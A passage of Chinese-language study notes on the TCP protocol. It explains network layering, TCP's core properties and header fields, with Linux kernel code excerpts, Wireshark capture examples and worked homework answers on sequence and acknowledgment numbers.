<p>IP 协议是网络层的主要协议，TCP 和 UDP 都是用 IP 协议作为网络层协议。这一层的主要作用是给包加上<code>源地址</code>和<code>目标地址</code>，将数据包传送到目标地址。</p>
<p>IP 协议是一个无连接的协议，也不具备重发机制，这也是 TCP 协议复杂的原因之一就是基于了这样一个「不靠谱」的协议。</p>
<h4 id="网络访问层（Network-Access-Layer）"><a href="#网络访问层（Network-Access-Layer）" class="headerlink" title="网络访问层（Network Access Layer）"></a>网络访问层（Network Access Layer）</h4><p>网络访问层也有说法叫做网络接口层，以太网、Wifi、蓝牙工作在这一层，网络访问层提供了主机连接到物理网络需要的硬件和相关的协议。</p>
<p>整体的分层图如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/5.jpg"></p>
<h3 id="分层的好处是什么呢？"><a href="#分层的好处是什么呢？" class="headerlink" title="分层的好处是什么呢？"></a>分层的好处是什么呢？</h3><p>分层的本质是通过分离关注点而让复杂问题简单化，通过分层可以做到：</p>
<p>1.<code>各层独立</code>：限制了依赖关系的范围，各层之间使用标准化的接口，各层不需要知道上下层是如何工作的，增加或者修改一个应用层协议不会影响传输层协议</p>
<p>2.<code>灵活性更好</code>：比如路由器不需要应用层和传输层，分层以后路由器就可以只用加载更少的几个协议层</p>
<p>3.<code>易于测试和维护</code>：提高了可测试性，可以独立的测试特定层，某一层有了更好的实现可以整体替换掉</p>
<p>4.<code>能促进标准化</code>：每一层职责清楚，方便进行标准化</p>
<h3 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h3><p>1.收到 IP 数据包解析以后，它怎么知道这个分组应该投递到上层的哪一个协议（UDP 或 TCP）</p>
<p>网络互联层 Internet Protocol Version 4 中有一个「protocol」标识，是通过它来判断投递到 TCP 或 UDP 。</p>
<h2 id="3-TCP-概述-——-可靠的、面向连接的、基于字节流、全双工的协议"><a href="#3-TCP-概述-——-可靠的、面向连接的、基于字节流、全双工的协议" class="headerlink" title="3 TCP 概述 —— 可靠的、面向连接的、基于字节流、全双工的协议"></a>3 TCP 概述 —— 可靠的、面向连接的、基于字节流、全双工的协议</h2><p>如果要用一句话来描述 TCP 协议，我想应该是：TCP 是一个<code>可靠的</code>（reliable）、<code>面向连接的</code>（connection-oriented）、<code>基于字节流</code>（byte-stream）、<code>全双工的</code>（full-duplex）协议</p>
<h3 id="0x01-TCP-是面向连接的协议"><a href="#0x01-TCP-是面向连接的协议" class="headerlink" title="0x01 TCP 是面向连接的协议"></a>0x01 TCP 是面向连接的协议</h3><p>一开始学习 TCP 的时候，我们就被告知 TCP 是面向连接的协议，那什么是面向连接，什么是无连接呢？</p>
<p>1.面向连接（connection-oriented）：面向连接的协议要求正式发送数据之前需要通过「握手」建立一个<code>逻辑</code>连接，结束通信时也是通过有序的四次挥手来断开连接。</p>
<p>2.无连接（connectionless）：无连接的协议则不需要</p>
<h4 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h4><p>建立连接的过程是通过「三次握手」来完成的，顾名思义，通过三次数据交换建立一个连接。 通过三次握手协商好双方后续通信的起始序列号、窗口缩放大小等信息。</p>
<p>如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/6.jpg"></p>
<h3 id="0x02-TCP-协议是可靠的"><a href="#0x02-TCP-协议是可靠的" class="headerlink" title="0x02 TCP 协议是可靠的"></a>0x02 TCP 协议是可靠的</h3><p>IP 是一种<code>无连接</code>、<code>不可靠</code>的协议：它尽最大可能将数据报从发送者传输给接收者，但并<code>不保证包到达的顺序</code>会与它们被传输的顺序一致，也<code>不保证包是否重复</code>，甚至都<code>不保证包是否会达到接收者</code>。</p>
<p>TCP 要想在 IP 基础上构建可靠的传输层协议，必须有一个复杂的机制来保障可靠性。 主要有下面几个方面：</p>
<p>1.对每个包提供<code>校验和</code></p>
<p>2.包的<code>序列号</code>解决了接收数据的<code>乱序</code>、<code>重复</code>问题</p>
<p>3.超时重传</p>
<p>4.流量控制、拥塞控制</p>
<p><code>校验和（checksum）</code> 每个 TCP 包首部中都有两字节用来表示校验和，防止在传输过程中有损坏。如果收到一个校验和有差错的报文，TCP 不会发送任何确认<code>直接丢弃它</code>，等待发送端重传。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/7.jpg"></p>
<p><code>包的序列号保证了接收数据的乱序和重复问题</code> 假设我们往 TCP 套接字里写 3000 字节的数据导致 TCP发送了 3 个数据包，每个数据包大小为 1000 字节：第一个包序列号为[1-1001)，第二个包序列号为 [1001-2001)，第三个包序号为[2001-3001)</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/8.jpg"></p>
<p>假如因为网络的原因导致第二个、第三个包先到接收端，第一个包最后才到，接收端也不会因为他们到达的顺序不一致把包弄错，<code>TCP</code> 会根据他们的<code>序号</code>进行重新的<code>排列</code>然后把结果传递给上层应用程序。</p>
<p>如果 TCP 接收到重复的数据，可能的原因是超时重传了两次但这个包并没有丢失，接收端会收到两次同样的数据，它能够根据包序号丢弃重复的数据。</p>
<p><code>超时重传</code> TCP 发送数据后会启动一个定时器，等待对端确认收到这个数据包。如果在指定的时间内没有收到 ACK 确认，就会重传数据包，然后等待更长时间，如果还没有收到就再重传，<code>在多次重传仍然失败以后，TCP 会放弃这个包</code>。后面我们讲到超时重传模块的时候会详细介绍这部分内容。</p>
<p><code>流量控制</code>、<code>拥塞控制</code> 这部分内容较复杂，后面有专门的文章进行讲解，这里先不展开。</p>
<h3 id="0x03-TCP-是面向字节流的协议"><a href="#0x03-TCP-是面向字节流的协议" class="headerlink" title="0x03 TCP 是面向字节流的协议"></a>0x03 TCP 是面向字节流的协议</h3><p>TCP 是一种<code>字节流</code>（byte-stream）协议，流的含义是<code>没有固定的报文边界</code>。</p>
<p>假设你调用 2 次 write 函数往 socket 里依次写 500 字节、800 字节。write 函数只是把字节拷贝到<code>内核缓冲区</code>，最终会以多少条报文发送出去是<code>不确定的</code>，如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/9.jpg"></p>
<p>情况 1：分为两条报文依次发出去 500 字节 和 800 字节数据<br>情况 2：两部分数据合并为一个长度为 1300 字节的报文，一次发送<br>情况 3：第一部分的 500 字节与第二部分的 500 字节合并为一个长度为 1000 字节的报文，第二部分剩下的 300 字节单独作为一个报文发送<br>情况 4：第一部分的 400 字节单独发送，剩下100字节与第二部分的 800 字节合并为一个 900 字节的包一起发送。<br>情况 N：还有更多可能的拆分组合  </p>
<p>上面出现的情况取决于诸多因素：路径最大传输单元 <code>MTU</code>、<code>发送窗口大小</code>、<code>拥塞窗口大小</code>等。</p>
<p>当接收方从 TCP 套接字读数据时，<code>它是没法得知对方每次写入的字节是多少的</code>。接收端可能分2 次每次 650 字节读取，也有可能先分三次，一次 100 字节，一次 200 字节，一次 1000 字节进行读取。</p>
<h3 id="0x04-TCP-是全双工的协议"><a href="#0x04-TCP-是全双工的协议" class="headerlink" title="0x04 TCP 是全双工的协议"></a>0x04 TCP 是全双工的协议</h3><p>在 TCP 中发送端和接收端<code>可以是</code>客户端/服务端，<code>也可以是</code>服务器/客户端，通信的双方在任意时刻既可以是接收数据也可以是发送数据，每个方向的数据流都<code>独立管理````序列号</code>、<code>滑动窗口大小</code>、<code>MSS</code> 等信息。</p>
<h3 id="0x05-小结与思考"><a href="#0x05-小结与思考" class="headerlink" title="0x05 小结与思考"></a>0x05 小结与思考</h3><p>TCP 是一个<code>可靠的</code>（reliable）、<code>面向连接的</code>（connection-oriented）、<code>基于字节流</code>（byte-stream）、<code>全双工</code>（full-duplex）的协议。<code>发送端</code>在发送数据以后启动一个<code>定时器</code>，如果超时没有收到对端确认会进行重传，接收端利用<code>序列号</code>对收到的包进行<code>排序</code>、<code>丢弃重复数据</code>，TCP 还提供了<code>流量控制</code>、<code>拥塞控制</code>等机制保证了稳定性。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/10.jpg"></p>
<h3 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h3><p>TCP提供了一种字节流服务，而收发双方都不保持记录的边界，应用程序应该如何提供他们自己的记录标识呢？</p>
<p>这就涉及tcp沾包和拆包问题了，发送端给每个数据包添加包首部，首部中应该至少包含数据包的长度；发送端将每个数据包封装为固定长度（不够的可以通过补0填充）；在数据包之间设置边界，如添加特殊符号。</p>
<h2 id="4-来自-Google-的协议栈测试神器-——-packetdrill"><a href="#4-来自-Google-的协议栈测试神器-——-packetdrill" class="headerlink" title="4 来自 Google 的协议栈测试神器 —— packetdrill"></a>4 来自 Google 的协议栈测试神器 —— packetdrill</h2><h2 id="5-支撑-TCP-协议的基石-——-剖析首部字段"><a href="#5-支撑-TCP-协议的基石-——-剖析首部字段" class="headerlink" title="5 支撑 TCP 协议的基石 —— 剖析首部字段"></a>5 支撑 TCP 协议的基石 —— 剖析首部字段</h2><p> 完整的 TCP 头部如下图所示</p>
<p> <img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/11.jpg"></p>
<p> 我们用一次访问百度网页抓包的例子来开始。<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v www.baidu.com</span><br></pre></td></tr></table></figure><br><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/12.jpg"></p>
<h3 id="源端口号、目标端口号"><a href="#源端口号、目标端口号" class="headerlink" title="源端口号、目标端口号"></a>源端口号、目标端口号</h3><p>在第一个包的详情中，首先看到的高亮部分的<code>源端口号</code>（Src Port）和<code>目标端口号</code>（Dst Port)，这个例子中本地源端口号为 61024，百度目标端口号是 80。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/13.jpg"></p>
<p>TCP 报文头部里没有<code>源 ip</code> 和<code>目标 ip</code> 地址，只有源端口号和目标端口号</p>
<p>这也是初学 wireshark 抓包时很多人会有的一个疑问：过滤 ip 地址为 172.19.214.24 包的条件为什么不是 “tcp.addr == 172.19.214.24”，而是 “ip.addr == 172.19.214.24”</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/14.jpg"></p>
<p>TCP 的报文里是没有<code>源 ip </code>和<code>目标 ip</code> 的，因为那是 IP 层协议的事情，TCP 层只有源端口和目标端口。</p>
<p><code>源 IP</code>、<code>源端口</code>、<code>目标 IP</code>、<code>目标端口</code>构成了 TCP 连接的「四元组」。一个四元组可以<code>唯一标识</code>一个连接。</p>
<h3 id="序列号（Sequence-number）"><a href="#序列号（Sequence-number）" class="headerlink" title="序列号（Sequence number）"></a>序列号（Sequence number）</h3><p>TCP 是面向字节流的协议，通过 TCP 传输的字节流的每个字节都分配了序列号，序列号（Sequence number）指的是<code>本报文段第一个字节的序列号</code>。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/15.jpg"></p>
<p>序列号加上报文的长度，就可以确定传输的是哪一段数据。序列号是一个 <code>32 位的无符号整数</code>，达到 2^32-1 后循环到 0。</p>
<p>在 SYN 报文中，序列号用于交换彼此的<code>初始序列号</code>，在其它报文中，序列号用于保证包的顺序。</p>
<p>因为网络层（IP 层）不保证包的顺序，TCP 协议利用<code>序列号</code>来解决网络包<code>乱序</code>、<code>重复</code>的问题，以保证数据包以正确的顺序组装传递给上层应用。</p>
<p>如果发送方发送的是四个报文序列号分别是1、2、3、4，但到达接收方的顺序是 2、4、3、1，接收方就可以通过<code>序列号</code>的大小顺序组装出原始的数据。</p>
<h4 id="初始序列号（Initial-Sequence-Number-ISN）"><a href="#初始序列号（Initial-Sequence-Number-ISN）" class="headerlink" title="初始序列号（Initial Sequence Number, ISN）"></a>初始序列号（Initial Sequence Number, ISN）</h4><p>在建立连接之初，通信双方都会各自选择一个序列号，称之为<code>初始序列号</code>。在建立连接时，通信双方通过 SYN 报文交换彼此的 <code>ISN</code>，如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/16.jpg"></p>
<p>初始建立连接的过程中 SYN 报文交换过程如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/17.jpg"></p>
<p>其中第 2 步和第 3 步可以合并一起，这就是三次握手的过程</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/18.jpg"></p>
<h4 id="初始序列号是如何生成的"><a href="#初始序列号是如何生成的" class="headerlink" title="初始序列号是如何生成的"></a>初始序列号是如何生成的</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__u32 secure_tcp_sequence_number(__be32 saddr, __be32 daddr,</span><br><span class="line">				 __be16 sport, __be16 dport)</span><br><span class="line">&#123;</span><br><span class="line">	u32 hash[MD5_DIGEST_WORDS];</span><br><span class="line"></span><br><span class="line">	net_secret_init();</span><br><span class="line">	hash[0] &#x3D; (__force u32)saddr;</span><br><span class="line">	hash[1] &#x3D; (__force u32)daddr;</span><br><span class="line">	hash[2] &#x3D; ((__force u16)sport &lt;&lt; 16) + (__force u16)dport;</span><br><span class="line">	hash[3] &#x3D; net_secret[15];</span><br><span class="line">	</span><br><span class="line">	md5_transform(hash, net_secret);</span><br><span class="line"></span><br><span class="line">	return seq_scale(hash[0]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static u32 seq_scale(u32 seq)</span><br><span class="line">&#123;</span><br><span class="line">	return seq + (ktime_to_ns(ktime_get_real()) &gt;&gt; 6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码中的 net_secret 是一个长度为 16 的 int 数组，只有在第一次调用 net_secret_init 的时时候会将将这个数组的值初始化为随机值。在系统重启前保持不变。</p>
<p>可以看到初始序列号的计算函数<code>secure_tcp_sequence_number()</code>的逻辑是通过<code>源地址</code>、<code>目标地址</code>、<code>源端口</code>、<code>目标端口</code>和<code>随机因子</code>通过 MD5 进行进行计算。如果仅有这几个因子，对于四元组相同的请求，计算出的初始序列号总是相同，这必然有很大的安全风险，所以函数的最后将计算出的序列号通过 seq_scale 函数再次计算。</p>
<p>seq_scale 函数加入了<code>时间因子</code>，对于四元组相同的连接，序列号也<code>不会重复</code>了。</p>
<h4 id="序列号回绕了怎么处理"><a href="#序列号回绕了怎么处理" class="headerlink" title="序列号回绕了怎么处理"></a>序列号回绕了怎么处理</h4><p>序列号是一个 32 位的无符号整数，从前面介绍的初始序列号计算算法可以知道，ISN 并不是从 0 开始，所以同一个连接的序列号是有可能<code>溢出回绕</code>（sequence wraparound）的。TCP 的很多校验比如丢包、乱序判断都是通过比较包的序号来实现的，我们来看看 linux 内核是如何处理的，代码如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static inline bool before(__u32 seq1, __u32 seq2)</span><br><span class="line">&#123;</span><br><span class="line">        return (__s32)(seq1-seq2) &lt; 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <code>__u32</code> 表示无符号的 32 位整数，<code>__s32</code>表示有符号的 32 位整数。为什么 seq1 - seq2 转为有符号的 32 位整数就可以判断 seq1 和 seq2 的大小了呢？</p>
<p>以 seq1 为 0xFFFFFFFF、seq2 为 0x02（回绕）为例，它们相减的结果如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seq1 - seq2 &#x3D; 0xFFFFFFFF - 0x02 &#x3D; 0xFFFFFFFD</span><br></pre></td></tr></table></figure>
<p>0xFFFFFFFD 最高位为 1，表示为负数，实际值为 -(0x00000002 + 1) = -3，这样即使 seq2 回绕了，也可以知道 seq1 &lt; seq2。</p>
<h3 id="确认号"><a href="#确认号" class="headerlink" title="确认号"></a>确认号</h3><p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/19.jpg"></p>
<p>TCP 使用确认号（Acknowledgment number, ACK）来告知对方<code>下一个期望接收的序列号</code>，<code>小于此确认号的所有字节都已经收到</code>。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/20.jpg"></p>
<p>关于确认号有几个注意点：</p>
<p>1.不是所有的包都需要确认的</p>
<p>2.不是收到了数据包就立马需要确认的，<code>可以延迟</code>一会再<code>确认</code></p>
<p>3.ACK 包本身不需要被确认，否则就会无穷无尽死循环了</p>
<p>4.确认号永远是表示<code>小于此确认号的字节</code>都已经收到</p>
<h3 id="TCP-Flags"><a href="#TCP-Flags" class="headerlink" title="TCP Flags"></a>TCP Flags</h3><p>TCP 有很多种<code>标记</code>，有些用来发起连接同步初始序列号，有些用来确认数据包，还有些用来结束连接。TCP 定义了一个 8 位的字段用来表示 flags，大部分都只用到了后 6 个，如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/21.jpg"></p>
<p>下面这个是 wireshark 第一个 SYN 包的 flags 截图</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/22.jpg"></p>
<p>我们通常所说的 <code>SYN</code>、<code>ACK</code>、<code>FIN</code>、<code>RST</code> 其实只是把 flags 对应的 bit 位置为 1 而已，这些标记可以组合使用，比如 SYN+ACK，FIN+ACK 等</p>
<p><code>SYN</code>（Synchronize）：用于发起连接数据包同步双方的初始序列号</p>
<p><code>ACK</code>（Acknowledge）：确认数据包</p>
<p><code>RST</code>（Reset）：这个标记用来<code>强制断开连接</code>，通常是之前建立的<code>连接已经不在了</code>、<code>包不合法</code>、或者实在<code>无能为力处理</code></p>
<p><code>FIN</code>（Finish）：通知对方我发完了所有数据，准备断开连接，后面我不会再发数据包给你了。</p>
<p><code>PSH</code>（Push）：告知对方这些数据包收到以后应该<code>马上</code>交给上层应用，不能缓存起来</p>
<h3 id="窗口大小"><a href="#窗口大小" class="headerlink" title="窗口大小"></a>窗口大小</h3><p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/23.jpg"></p>
<p>可以看到用于表示窗口大小的”Window Size” 只有 16 位，可能 TCP 协议设计者们认为 16 位的窗口大小已经够用了，也就是最大窗口大小是 65535 字节（<code>64KB</code>）。就像网传盖茨曾经说过：“640K内存对于任何人来说都足够了”一样。</p>
<p>自己挖的坑当然要自己填，因此TCP 协议引入了「TCP 窗口缩放」选项 作为窗口缩放的比例因子，比例因子值的范围是 0 ~ 14，其中最小值 0 表示不缩放，最大值 14。比例因子可以将窗口扩大到原来的 2 的 n 次方，比如窗口大小缩放前为 1050，缩放因子为 7，则真正的窗口大小为 1050 * 128 = 134400，如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/24.jpg"></p>
<p>在 wireshark 中最终的窗口大小会自动计算出来，如下图中的 <code>Calculated window size</code>。以本文中抓包的例子为例</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/25.jpg"></p>
<p>值得注意的是，<code>窗口缩放值</code>在<code>三次握手</code>的时候<code>指定</code>，如果抓包的时候没有抓到 SYN 包，wireshark 是不知道真正的窗口缩放值是多少的。</p>
<h3 id="可选项"><a href="#可选项" class="headerlink" title="可选项"></a>可选项</h3><p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/26.jpg"></p>
<p>可选项的格式入下所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/27.jpg"></p>
<p>以 MSS 为例，kind=2，length=4，value=1460</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/28.jpg"></p>
<p>常用的选项有以下几个：</p>
<p>1.MSS：最大段大小选项，是 TCP 允许的<code>从对方接收的最大报文段</code><br>2.SACK：选择确认选项<br>3.Window Scale：窗口缩放选项  </p>
<h3 id="作业题"><a href="#作业题" class="headerlink" title="作业题"></a>作业题</h3><p>1、如果一个 TCP 连接正在传送 5000 字节的数据，第一个字节的序号是 10001，数据被分为 5 段，每个段携带 1000 字节，请问每个段的序号是什么？</p>
<p>10001 11001 12001 13001 14001</p>
<p>2.A B 两个主机之间建立了一个 TCP 连接，A 主机发给 B 主机两个 TCP 报文，大小分别是 500 和 300，第一个报文的序列号是 200，那么 B 主机接收两个报文后，返回的确认号是（D）</p>
<p>1.A、200<br>2.B、700<br>3.C、800<br>4.D、1000  </p>
<p>3.客户端的使用 <code>ISN=2000</code> 打开一个连接，服务器端使用 <code>ISN=3000</code> 打开一个连接，经过 3 次握手建立连接。连接建立起来以后，假定客户端向服务器发送一段数据<code>Welcome the server!</code>（长度 20 Bytes），而服务器的回答数据<code>Thank you!</code>（长度 10 Bytes ），试画出三次握手和数据传输阶段报文段序列号、确认号的情况。</p>
<p>1.client: seq = 2000, syn = 1,发送后进入syn_send阶段</p>
<p>2.server: seq = 3000, ack = 1, ackNum = 2001, syn = 1,发送后进入syn_received阶段</p>
<p>3.client: ack = 1,  ackNum = 3001,发送后进入establish阶段,server收到后进入establish阶段</p>
<p>如果3发生丢失,server端的重传计数器会重新发送syn_ack报文,总共发送 net.ipv4.tcp_synack_retries次,client在没有收到重传的syn_ack之前，发送数据给server端，由于server端的状态为syn_received状态，而不是establish状态，就会发送rst报文给client端，client就能接收到server侧未收到ack报文。</p>
<p>4.client: seq = 2001, len = 20, </p>
<p>4.1server: ack = 1, ackNum = 2021</p>
<p>5.server: seq = 3001, len = 10</p>
<p>5.1client: ack = 1, ackNum = 3011</p>
<h2 id="6-数据包大小对网络的影响-——-MTU-与-MSS-的奥秘"><a href="#6-数据包大小对网络的影响-——-MTU-与-MSS-的奥秘" class="headerlink" title="6 数据包大小对网络的影响 —— MTU 与 MSS 的奥秘"></a>6 数据包大小对网络的影响 —— MTU 与 MSS 的奥秘</h2><h3 id="最大传输单元（Maximum-Transmission-Unit-MTU）"><a href="#最大传输单元（Maximum-Transmission-Unit-MTU）" class="headerlink" title="最大传输单元（Maximum Transmission Unit, MTU）"></a>最大传输单元（Maximum Transmission Unit, MTU）</h3><p>数据链路层传输的帧大小是有限制的，不能把一个太大的包直接塞给链路层，这个限制被称为「最大传输单元（<code>Maximum Transmission Unit</code>, <code>MTU</code>）」</p>
